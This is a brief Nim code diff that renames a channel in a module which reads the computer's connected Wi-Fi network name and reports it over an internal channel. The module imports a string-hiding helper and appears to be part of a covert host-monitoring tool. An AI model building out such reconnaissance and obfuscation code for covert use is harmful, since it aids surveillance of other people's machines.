@@ -3,7 +3,7 @@ from strutils import contains
 
 from osproc import execProcess
 
-from ../channels import mainThread
+from ../channels import mainChannel
 
 import ../functions/hideString
 
@@ -14,7 +14,7 @@ proc getConnectedWifi(): void =
     if line.contains("SSID") and not line.contains("BSSID"):
       let SSID: string = "\"" & line.split(": ")[1] & "\""
 
-      mainThread.send "connected to: " & SSID
+      mainChannel.send "connected to: " & SSID
 
 
 proc initConnectedWifiThread*(): void {.thread.} =
